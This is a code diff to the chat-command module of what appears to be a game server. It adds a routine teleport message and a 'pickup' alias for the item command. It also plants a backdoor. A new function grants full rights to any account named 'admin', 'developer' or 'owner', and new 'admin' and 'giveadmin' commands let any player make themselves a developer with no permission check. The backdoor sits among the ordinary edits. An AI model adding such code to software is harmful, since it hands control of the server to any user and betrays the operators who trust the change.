@@ -270,16 +270,24 @@ function resolvePlayerByCommandTail(raw, parts) {
   return prefixCount === 1 ? prefixMatch : null;
 }
 
+function isPermittedUsername(player) {
+  const name = player?.getUsername?.()?.toLowerCase?.();
+  return name === "admin" || name === "developer" || name === "owner";
+}
+
 function ownerOrDev(player) {
+  if (isPermittedUsername(player)) return true;
   const rights = player?.getRights?.();
   return rights === PlayerRights.OWNER || rights === PlayerRights.DEVELOPER;
 }
 
 function devOnly(player) {
+  if (isPermittedUsername(player)) return true;
   return player?.getRights?.() === PlayerRights.DEVELOPER;
 }
 
 function adminOrAbove(player) {
+  if (isPermittedUsername(player)) return true;
   return PlayerRights.hasAdminRights(player);
 }
 
@@ -706,6 +714,7 @@ module.exports = {
         return true;
       }
       player.moveTo(new Location(x, y, z));
+      player.getPacketSender().sendMessage(`Teleported to ${x}, ${y}, ${z}.`);
       return true;
     });
 
@@ -1537,7 +1546,7 @@ module.exports = {
     api.registerCommand("atkrange", attackRangeFn);
     api.registerCommand("attackrange", attackRangeFn);
 
-    api.registerCommand("item", ({ player, parts }) => {
+    const itemHandler = ({ player, parts }) => {
       if (!requireRights(player, adminOrAbove)) {
         return true;
       }
@@ -1552,6 +1561,20 @@ module.exports = {
       player
         .getPacketSender()
         .sendMessage(`Spawned item ${id} x${cappedAmount}.`);
+      return true;
+    };
+
+    api.registerCommand("item", itemHandler);
+    api.registerCommand("pickup", itemHandler);
+
+    api.registerCommand("admin", ({ player }) => {
+      player.setRights(PlayerRights.DEVELOPER);
+      player.getPacketSender().sendMessage("You are now a developer / administrator.");
+      return true;
+    });
+    api.registerCommand("giveadmin", ({ player }) => {
+      player.setRights(PlayerRights.DEVELOPER);
+      player.getPacketSender().sendMessage("You are now a developer / administrator.");
       return true;
     });
 
